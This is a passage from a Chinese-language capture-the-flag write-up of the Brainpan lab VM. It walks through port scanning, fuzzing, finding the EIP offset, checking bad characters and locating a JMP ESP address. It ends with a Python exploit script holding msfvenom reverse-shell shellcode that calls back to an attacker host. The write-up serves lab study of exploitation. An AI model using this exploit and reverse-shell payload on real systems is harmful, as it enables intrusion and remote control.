class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2</span><br><span class="line">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x</span><br><span class="line">SF:20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x</span><br><span class="line">SF:20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x</span><br><span class="line">SF:20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|</span><br><span class="line">SF:\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x</span><br><span class="line">SF:20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x</span><br><span class="line">SF:20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x</span><br><span class="line">SF:20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_</span><br><span class="line">SF:\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2</span><br><span class="line">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x2</span><br><span class="line">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x</span><br><span class="line">SF:20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x</span><br><span class="line">SF:20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\</span><br><span class="line">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20&gt;&gt;\x20&quot;);</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 47.28 seconds</span><br></pre></td></tr></table></figure>

<p>只开放了两个端口。</p>
<ul>
<li>10000-http python的simplehttpserver</li>
<li>9999 Unknow</li>
</ul>
<p>9999<br><img src="https://images.atsud0.me/images/post/Screenshot_20200625_112338.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200625_112823.jpg" alt=""></p>
<p>10000<br><img src="https://images.atsud0.me/images/post/Screenshot_20200625_112546.jpg" alt=""><br><img src="https://images.atsud0.me/images/post/Screenshot_20200625_112610.jpg" alt=""></p>
<p>什么都没有的样子，进行目录探测。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ gobuster dir -u &quot;http:&#x2F;&#x2F;192.168.56.4:10000&#x2F;&quot; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Url:            http:&#x2F;&#x2F;192.168.56.4:10000&#x2F;</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster&#x2F;3.0.1</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2020&#x2F;06&#x2F;24 23:25:03 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;$</span><br><span class="line">&#x2F;bin (Status: 301)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2020&#x2F;06&#x2F;24 23:25:18 Finished</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>在bin目录下发现一个exe程序。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200625_112734.jpg" alt=""></p>
<p>将其下载下来。我放在了win xp上面运行了。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200625_113047.jpg" alt=""></p>
<p>对测试机进行nc连接。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200625_113141.jpg" alt=""></p>
<p>此时如果strings brainpan.exe会发现存在几个危险函数<br><img src="https://images.atsud0.me/images/post/Screenshot_20200625_113513.jpg" alt=""></p>
<ul>
<li>strcpy()<blockquote>
<p>strcpy()函数将源字符串复制到缓冲区。没有指定要复制字符的具体数目！如果源字符串碰巧来自用户输入，且没有专门限制其大小，则有可能会造成缓冲区溢出</p>
</blockquote>
</li>
</ul>
<h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><h3 id="是否存在缓冲区溢出"><a href="#是否存在缓冲区溢出" class="headerlink" title="是否存在缓冲区溢出"></a>是否存在缓冲区溢出</h3><p>接下来进行测试看是否存在缓冲区溢出</p>
<p>编写一个python脚本来进行模糊测试。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">host=<span class="string">'192.168.40.243'</span></span><br><span class="line">port=<span class="number">9999</span></span><br><span class="line">buffer = [<span class="string">"A"</span>]</span><br><span class="line">counter = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> len(buffer) &lt;= <span class="number">50</span>:</span><br><span class="line">    buffer.append(<span class="string">"A"</span> * counter)</span><br><span class="line">    counter = counter + <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> string <span class="keyword">in</span> buffer:</span><br><span class="line">    print(<span class="string">"Fuzzing PASS with &#123;&#125; bytes"</span>.format(len(string)))</span><br><span class="line">    s = socket.socket()</span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s.recv(<span class="number">4096</span>)</span><br><span class="line">    s.send(string)</span><br><span class="line">    s.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>


<p><img src="https://images.atsud0.me/images/post/Screenshot_20200625_114155.jpg" alt=""></p>
<p>当发送600个字符的内容时，程序崩溃。并且EIP和EBP寄存器被’A’填满。证明了程序存在缓冲区溢出。</p>
<h3 id="计算ESP什么时候会溢出，填满EIP"><a href="#计算ESP什么时候会溢出，填满EIP" class="headerlink" title="计算ESP什么时候会溢出，填满EIP"></a>计算ESP什么时候会溢出，填满EIP</h3><p>使用msf的脚本来生成字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;opt&#x2F;metasploit&#x2F;tools&#x2F;exploit&#x2F;pattern_create.rb -l 600</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9</span><br></pre></td></tr></table></figure>

<p>修改脚本内容为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">host=<span class="string">'192.168.40.243'</span></span><br><span class="line">port=<span class="number">9999</span></span><br><span class="line">s = socket.socket()</span><br><span class="line">buffer=<span class="string">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"</span></span><br><span class="line">s.connect((host,port))</span><br><span class="line">s.recv(<span class="number">4096</span>)</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.recv(<span class="number">4096</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200625_115401.jpg" alt=""></p>
<p>运行脚本之后，EIP的内容为35724134。转换为人类可读形式则是:34417235-&gt;4Ar5，EIP寄存器的内容为4Ar5。总不能一个个数吧？所以使用msf的脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;opt&#x2F;metasploit&#x2F;tools&#x2F;exploit&#x2F;pattern_offset.rb -q 35724134 -l 600</span><br><span class="line">[*] Exact match at offset 524</span><br></pre></td></tr></table></figure>
<p>前524个字符是EBP寄存器的值，所以EIP的值等于525，526，527，528的内容。</p>
<p>重新编写脚本来验证。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">host=<span class="string">'192.168.40.243'</span></span><br><span class="line">port=<span class="number">9999</span></span><br><span class="line">s = socket.socket()</span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">524</span>+<span class="string">"B"</span>*<span class="number">4</span></span><br><span class="line">s.connect((host,port))</span><br><span class="line">s.recv(<span class="number">4096</span>)</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.recv(<span class="number">4096</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
<p>如果猜想正确的话，运行这个脚本之后，EIP寄存器的值应该是4个B，42424242。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200625_120156.jpg" alt=""><br>EIP的值已经被精确的填入4个B了。</p>
<h3 id="计算ESP能存放多少字符"><a href="#计算ESP能存放多少字符" class="headerlink" title="计算ESP能存放多少字符"></a>计算ESP能存放多少字符</h3><p>ESP的大小限制了shellcode的大小，如果ESP只能存放400字节的内容，那么shellcode的字节内容就不能超过ESP的上限。并且最好留出一部分字节内容来传入’\x90’来保护shellcode的前部分代码不会被擦除。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">host=<span class="string">'192.168.40.243'</span></span><br><span class="line">port=<span class="number">9999</span></span><br><span class="line">s = socket.socket()</span><br><span class="line">buffer = <span class="string">'A'</span> * <span class="number">524</span> + <span class="string">'B'</span> * <span class="number">4</span> + <span class="string">'C'</span> * (<span class="number">3000</span> - <span class="number">524</span> - <span class="number">4</span>)</span><br><span class="line">s.connect((host, port))</span><br><span class="line">s.recv(<span class="number">4096</span>)</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.recv(<span class="number">4096</span>)</span><br></pre></td></tr></table></figure>

<p>这里要获得寄存器能够存放多少个字符，所以往大写了，当运行之后有多少个C被显示，就是ESP寄存器的大小。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200625_121247.jpg" alt=""><br>ESP寄存器已经被<code>C</code>所填满。找到ESP寄存器的起始地址和结束地址。我这里的起始地址为0022F960，结束地址为0022FB34。</p>
<p>用结束地址减去起始地址得到的值，就是ESP寄存器大小的值。</p>
<blockquote>
<p>0xB34-0x960=2868-2400=468</p>
</blockquote>
<p>468个字符，已经能够存放我们的shellcode了。</p>
<h3 id="挑选坏字符"><a href="#挑选坏字符" class="headerlink" title="挑选坏字符"></a>挑选坏字符</h3><blockquote>
<p>缓冲区溢出的在生成shellcode时，会影响输入的字符，比如’n’字符会终止输入，会截断输入导致我们输入的字符不能完全进入缓冲区。</p>
</blockquote>
<p>由于以上原因，所以我们需要挑选出坏字符。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">badchars = (</span><br><span class="line">        <span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x00"</span></span><br><span class="line">        <span class="string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x10"</span></span><br><span class="line">        <span class="string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x20"</span></span><br><span class="line">        <span class="string">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x30"</span></span><br><span class="line">        <span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x40"</span></span><br><span class="line">        <span class="string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x50"</span></span><br><span class="line">        <span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x60"</span></span><br><span class="line">        <span class="string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x70"</span></span><br><span class="line">        <span class="string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x80"</span></span><br><span class="line">        <span class="string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x90"</span></span><br><span class="line">        <span class="string">"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xa0"</span></span><br><span class="line">        <span class="string">"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xb0"</span></span><br><span class="line">        <span class="string">"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xc0"</span></span><br><span class="line">        <span class="string">"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xd0"</span></span><br><span class="line">        <span class="string">"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xe0"</span></span><br><span class="line">        <span class="string">"\xe1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\xf0"</span>)</span><br></pre></td></tr></table></figure>
<p>将上一节的脚本修改以下地方</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">buffer &#x3D; &#39;A&#39; * 524 + &#39;B&#39; * 4 + badchars</span><br></pre></td></tr></table></figure>
<p>运行之后，我们可以看到ESP的内容在\x09之后就没有\x00。所以应该是被截断了。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200625_122304.jpg" alt=""></p>
<p>将badchars的\x00修改为\x01，再次运行。此时就正常显示了。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200625_122548.jpg" alt=""></p>
<p>坏字符为:\x00</p>
<h3 id="找到跳板地址"><a href="#找到跳板地址" class="headerlink" title="找到跳板地址"></a>找到跳板地址</h3><p>ESP的内存地址并不是固定的，而我们的shellcode是存放在ESP寄存器中的，所以我们要找到一个办法让程序能够跳转到ESP寄存器中，执行我们的shellcode。</p>
<p>汇编中有一条指令 JMP ESP。如果我们能够找到这条指令的内存地址，那么我们就能修改EIP寄存器的值为JMP ESP的内存地址，由该指令跳转到ESP寄存器来执行我们的shellcode。</p>
<p>在此之前先查看程序的保护机制。<br>输入<code>!mona modules</code><br><img src="https://images.atsud0.me/images/post/Screenshot_20200625_123259.jpg" alt=""></p>
<p>可以看到brainpan.exe的系统保护机制和rebase都为Flase，可以直接拿来利用。</p>
<p>使用nasm_shell来获得jmp esp的十六进制指令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;tools&#x2F;exploit&#x2F;nasm_shell.rb</span><br><span class="line">nasm &gt; jmp esp</span><br><span class="line">0000000 FFE4 jmp esp</span><br></pre></td></tr></table></figure>

<p>jmp esp的十六进制指令为FFE4.</p>
<p>在Immunity Debugger中输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!mona find -s &quot;\xff\xe4&quot; -m brainpan.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200625_123943.jpg" alt=""></p>
<p>得到的地址为0x311712f3，转换为计算机可读形式为:\xf3\x12\x17\x31</p>
<p>代码中EIP的值就是’\xf3\x12\x17\x31’，因为我们要让其跳转到ESP寄存器，执行我们的代码。</p>
<h4 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h4><p>使用msfvenom来生成shellcode</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.40.204 LPORT&#x3D;4444 -b &quot;\x00&quot; -f python -e x86&#x2F;shikata_ga_nai -a x86</span><br></pre></td></tr></table></figure>

<p>修改代码为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">host=<span class="string">'192.168.40.243'</span></span><br><span class="line">port=<span class="number">9999</span></span><br><span class="line"></span><br><span class="line">buf = <span class="string">b""</span></span><br><span class="line">buf += <span class="string">b"\xdb\xc1\xb8\xb8\x37\x2a\x73\xd9\x74\x24\xf4\x5d\x2b"</span></span><br><span class="line">buf += <span class="string">b"\xc9\xb1\x52\x83\xc5\x04\x31\x45\x13\x03\xfd\x24\xc8"</span></span><br><span class="line">buf += <span class="string">b"\x86\x01\xa2\x8e\x69\xf9\x33\xef\xe0\x1c\x02\x2f\x96"</span></span><br><span class="line">buf += <span class="string">b"\x55\x35\x9f\xdc\x3b\xba\x54\xb0\xaf\x49\x18\x1d\xc0"</span></span><br><span class="line">buf += <span class="string">b"\xfa\x97\x7b\xef\xfb\x84\xb8\x6e\x78\xd7\xec\x50\x41"</span></span><br><span class="line">buf += <span class="string">b"\x18\xe1\x91\x86\x45\x08\xc3\x5f\x01\xbf\xf3\xd4\x5f"</span></span><br><span class="line">buf += <span class="string">b"\x7c\x78\xa6\x4e\x04\x9d\x7f\x70\x25\x30\x0b\x2b\xe5"</span></span><br><span class="line">buf += <span class="string">b"\xb3\xd8\x47\xac\xab\x3d\x6d\x66\x40\xf5\x19\x79\x80"</span></span><br><span class="line">buf += <span class="string">b"\xc7\xe2\xd6\xed\xe7\x10\x26\x2a\xcf\xca\x5d\x42\x33"</span></span><br><span class="line">buf += <span class="string">b"\x76\x66\x91\x49\xac\xe3\x01\xe9\x27\x53\xed\x0b\xeb"</span></span><br><span class="line">buf += <span class="string">b"\x02\x66\x07\x40\x40\x20\x04\x57\x85\x5b\x30\xdc\x28"</span></span><br><span class="line">buf += <span class="string">b"\x8b\xb0\xa6\x0e\x0f\x98\x7d\x2e\x16\x44\xd3\x4f\x48"</span></span><br><span class="line">buf += <span class="string">b"\x27\x8c\xf5\x03\xca\xd9\x87\x4e\x83\x2e\xaa\x70\x53"</span></span><br><span class="line">buf += <span class="string">b"\x39\xbd\x03\x61\xe6\x15\x8b\xc9\x6f\xb0\x4c\x2d\x5a"</span></span><br><span class="line">buf += <span class="string">b"\x04\xc2\xd0\x65\x75\xcb\x16\x31\x25\x63\xbe\x3a\xae"</span></span><br><span class="line">buf += <span class="string">b"\x73\x3f\xef\x61\x23\xef\x40\xc2\x93\x4f\x31\xaa\xf9"</span></span><br><span class="line">buf += <span class="string">b"\x5f\x6e\xca\x02\x8a\x07\x61\xf9\x5d\xe8\xde\x29\x52"</span></span><br><span class="line">buf += <span class="string">b"\x80\x1c\x29\x7b\x0d\xa8\xcf\x11\xbd\xfc\x58\x8e\x24"</span></span><br><span class="line">buf += <span class="string">b"\xa5\x12\x2f\xa8\x73\x5f\x6f\x22\x70\xa0\x3e\xc3\xfd"</span></span><br><span class="line">buf += <span class="string">b"\xb2\xd7\x23\x48\xe8\x7e\x3b\x66\x84\x1d\xae\xed\x54"</span></span><br><span class="line">buf += <span class="string">b"\x6b\xd3\xb9\x03\x3c\x25\xb0\xc1\xd0\x1c\x6a\xf7\x28"</span></span><br><span class="line">buf += <span class="string">b"\xf8\x55\xb3\xf6\x39\x5b\x3a\x7a\x05\x7f\x2c\x42\x86"</span></span><br><span class="line">buf += <span class="string">b"\x3b\x18\x1a\xd1\x95\xf6\xdc\x8b\x57\xa0\xb6\x60\x3e"</span></span><br><span class="line">buf += <span class="string">b"\x24\x4e\x4b\x81\x32\x4f\x86\x77\xda\xfe\x7f\xce\xe5"</span></span><br><span class="line">buf += <span class="string">b"\xcf\x17\xc6\x9e\x2d\x88\x29\x75\xf6\xb8\x63\xd7\x5f"</span></span><br><span class="line">buf += <span class="string">b"\x51\x2a\x82\xdd\x3c\xcd\x79\x21\x39\x4e\x8b\xda\xbe"</span></span><br><span class="line">buf += <span class="string">b"\x4e\xfe\xdf\xfb\xc8\x13\x92\x94\xbc\x13\x01\x94\x94"</span></span><br><span class="line"></span><br><span class="line">buffer = <span class="string">"A"</span> * <span class="number">524</span> + <span class="string">"\xf3\x12\x17\x31"</span> + buf</span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((host, port))</span><br><span class="line">s.recv(<span class="number">4096</span>)</span><br><span class="line">s.send(buffer) </span><br><span class="line">s.recv(<span class="number">4096</span>)</span><br></pre></td></tr></table></figure>

<p>但是，并没有正确的收到反弹的shell<br><img src="https://images.atsud0.me/images/post/Screenshot_20200625_125428.jpg" alt=""></p>
<p>将shellcode的字节和ESP寄存器的内容进行对比，会发现shellcode的前十六个字节内容被擦除了。</p>
<p>这里就要用到一开始提到的<code>\x90</code>来保护shellcode，保证shellcode的前部分代码不会被擦除。</p>
<p>修改代码</p>
